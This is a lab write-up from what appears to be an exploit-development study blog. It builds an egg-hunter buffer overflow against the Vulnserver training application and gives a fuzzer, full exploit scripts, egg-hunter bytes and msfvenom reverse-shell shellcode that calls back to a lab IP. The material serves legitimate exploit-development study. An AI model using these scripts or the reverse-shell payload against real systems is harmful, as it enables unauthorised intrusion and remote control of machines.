---
title: "Lets go Egg Hunting!"
date: "2020-04-10"
author: frosty
categories:
  - "projects"
tags:
  - "buffer-overflows"
  - "exploitation"
  - "osce"
coverImage: "eggs-1-e1597613155767.png"
---

It's that time of year when many around the world gather and go easter egg hunting. However, at the time of writing this we are advised to remain home. For me, this meant an opportunity to get my computer to go hunting eggs for me! Of course, in this case I mean buffer overflow egg hunting exploits. A buffer overflow is an exploit where the user is able to control the execution flow of a program.

Egg hunters are often used when there is not enough space for the adversary to place shell code. Instead, the adversary places egg hunter shell code and the computer will search the memory to look for the egg, and execute the shell code by the eggs. The egg is made up of 8 bytes, split into two identical tags. The "default" egg is `w00tw00t` where `w00t` is the tag. The reason we need to use two tags is to provide a more consistent method of finding the egg; and so that we don't find the tag within the code which sets the hunter going.

Before we get started into the details, I'd like to mention some links which helped me learn this.

- [InfoSec-Prep](https://discord.gg/YjXfq4g) community on Discord
- [FuzzySecurity](https://www.fuzzysecurity.com/tutorials/expDev/4.html)
- [H0mbre](https://h0mbre.github.io/Egghunter_GMON_Vulnserver/)

* * *

## Fuzzing the program

I wanted to use a simple application and vulnerability to learn, so I used Vulnserver and used the TRUN command which is commonly used to learn a vanilla EIP overwrite buffer overflow. I'll be exploiting Vulnserver with Immunity Debugger. The software will run in a 32-bit Windows 7 VM.

First we must identify the buffer length by reliably crashing the program. For this I use my fuzzer script below, and see that the application crashed when sending 2100 bytes.

```py
#!/usr/bin/python
import sys, socket
from time import sleep

ip = "10.21.1.14"
port = 9999
buffer = "A" * 100

while True:
    try:
        print "[+] Sending buffer of %s bytes" % str(len(buffer))

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.send(('TRUN /.:/' + buffer))
        s.close()

        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print "[-] Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

Using metasploit's pattern create, we are able to send a unique string and identify the offset at which EIP begins to be overwritten.

```sh
$ /usr/bin/msf-pattern_create -l 2100
Aa0Aa1[...]r8Cr9
$ /usr/bin/msf-pattern_offset -q 386F4337 -l 2100
[*] Exact match at offset 2003
```

```py
#!/usr/bin/python
import sys, socket

ip = '10.21.1.14'
port = 9999

# msfvenom code comes later

fuzz="A"*2003
ret ="B"*4

buffer = fuzz + ret + "C"*100

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('TRUN /.:/' + buffer))
    print "[+] Sending buffer"
    s.close()
except:
    print "[-] Failed!"
    sys.exit()
```

![Image](assets/img/blog/lets-go-egghunting/image-42.png)

Using Mona we are able to find a `jmp esp` instruction, which will allow us to point the program to our shell code which will trigger the egg hunter. As we are not performing a structured exception handler (SEH) buffer overflow here, we can use a `jmp esp` instruction. In this case we will use `0x625011AF`.

```txt
!mona jmp -r esp
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False,
 SafeSEH: False, OS: True, v-1.0- (C:\Users\WindowsUser\Desktop\vulnserver\essfunc.dll)
```

* * *

## Setting up the hunt

We are not yet finished with our initial buffer. We haven't generated the shellcode which will trigger the egg hunt. We can use mona again to help us create the hunter.

```txt
!mona help egg
!mona egg -t w00t
Egghunter , tag w00t :
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
Put this tag in front of your shellcode : w00tw00t
```

Lets place it inside our skeleton script in the initial buffer. We need to take away part of the "A"s that we are sending to overflow the application. In total, the buffer must still equal 2003 bytes before we write to EIP.
`2003 - len(hunter) - 5`

We also need to "jump back" 50 bytes to get to our hunter shell code. We can use the windows calculator for this and find that we need `\xCE` number of bytes. The jump opcode is `\xEB`.

```py
#!/usr/bin/python
import os, sys, socket

ip = "10.21.1.15"
port = 9999

# Badchars: \x00

hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# EIP: 625011AF
eip = "\xaf\x11\x50\x62"
jumpBack = "\xEB\xCE\x90\x90"

stage1 = "A"* (2003-len(hunter)-5) + hunter + "A" * 5 + eip + jumpBack

command = "TRUN /.:/"

buffer = command + stage1

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((ip, port))
exploit.send(buffer)
exploit.close()
```

* * *

## Setting up the Egg and Shellcode

Right now the script that we have does not have any shell code to execute, nor an egg to find. Therefore, it will search forever and the exploit will not work. Let's fix that! We need to place the egg and some shell code in the buffer. I think that right now our exploit could be considered unrealistic as we already have space for standard reverse shell code. However for the purpose of learning I carried on as we still need the program to find the egg. Lets create some shell code using `msfvenom`.

```sh
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.21.1.13 LPORT=1234 -b '\x00' -f python -v shellcode
[Output removed]
```

And lets put the egg and the shellcode in the buffer that we send to Vulnserver.

```py
#!/usr/bin/python
import os, sys, socket

ip = "10.21.1.15"
port = 9999

# Badchars: \x00

hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.21.1.13 LPORT=1234 -b '\x00' -f python -v shellcode

shellcode = ("\xd9\xe8\xd9\x74\x24\xf4\x5e\x31\xc9\xbb\xec\x25\x26\x8e\xb1"
"\x52\x83\xee\xfc\x31\x5e\x13\x03\xb2\x36\xc4\x7b\xb6\xd1\x8a"
"\x84\x46\x22\xeb\x0d\xa3\x13\x2b\x69\xa0\x04\x9b\xf9\xe4\xa8"
"\x50\xaf\x1c\x3a\x14\x78\x13\x8b\x93\x5e\x1a\x0c\x8f\xa3\x3d"
"\x8e\xd2\xf7\x9d\xaf\x1c\x0a\xdc\xe8\x41\xe7\x8c\xa1\x0e\x5a"
"\x20\xc5\x5b\x67\xcb\x95\x4a\xef\x28\x6d\x6c\xde\xff\xe5\x37"
"\xc0\xfe\x2a\x4c\x49\x18\x2e\x69\x03\x93\x84\x05\x92\x75\xd5"
"\xe6\x39\xb8\xd9\x14\x43\xfd\xde\xc6\x36\xf7\x1c\x7a\x41\xcc"
"\x5f\xa0\xc4\xd6\xf8\x23\x7e\x32\xf8\xe0\x19\xb1\xf6\x4d\x6d"
"\x9d\x1a\x53\xa2\x96\x27\xd8\x45\x78\xae\x9a\x61\x5c\xea\x79"
"\x0b\xc5\x56\x2f\x34\x15\x39\x90\x90\x5e\xd4\xc5\xa8\x3d\xb1"
"\x2a\x81\xbd\x41\x25\x92\xce\x73\xea\x08\x58\x38\x63\x97\x9f"
"\x3f\x5e\x6f\x0f\xbe\x61\x90\x06\x05\x35\xc0\x30\xac\x36\x8b"
"\xc0\x51\xe3\x1c\x90\xfd\x5c\xdd\x40\xbe\x0c\xb5\x8a\x31\x72"
"\xa5\xb5\x9b\x1b\x4c\x4c\x4c\x2e\x84\x4f\x81\x46\xa4\x4f\x9d"
"\x44\x21\xa9\xf7\x78\x64\x62\x60\xe0\x2d\xf8\x11\xed\xfb\x85"
"\x12\x65\x08\x7a\xdc\x8e\x65\x68\x89\x7e\x30\xd2\x1c\x80\xee"
"\x7a\xc2\x13\x75\x7a\x8d\x0f\x22\x2d\xda\xfe\x3b\xbb\xf6\x59"
"\x92\xd9\x0a\x3f\xdd\x59\xd1\xfc\xe0\x60\x94\xb9\xc6\x72\x60"
"\x41\x43\x26\x3c\x14\x1d\x90\xfa\xce\xef\x4a\x55\xbc\xb9\x1a"
"\x20\x8e\x79\x5c\x2d\xdb\x0f\x80\x9c\xb2\x49\xbf\x11\x53\x5e"
"\xb8\x4f\xc3\xa1\x13\xd4\xe3\x43\xb1\x21\x8c\xdd\x50\x88\xd1"
"\xdd\x8f\xcf\xef\x5d\x25\xb0\x0b\x7d\x4c\xb5\x50\x39\xbd\xc7"
"\xc9\xac\xc1\x74\xe9\xe4")

# EIP: 625011AF
eip = "\xaf\x11\x50\x62"
jumpBack = "\xEB\xCE\x90\x90"

stage2 = "w00tw00t" + shellcode
stage1 = stage2 + "A"* (2003-len(stage2)-len(hunter)-5) + hunter + "A" * 5 + eip + jumpBack

command = "TRUN /.:/"

buffer = command + stage1

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((ip, port))
exploit.send(buffer)
exploit.close()
```

* * *

## Win!

And there we have it! We let the script run, and let the application find the egg no problems.

![Image](assets/img/blog/lets-go-egghunting/image-43.png)
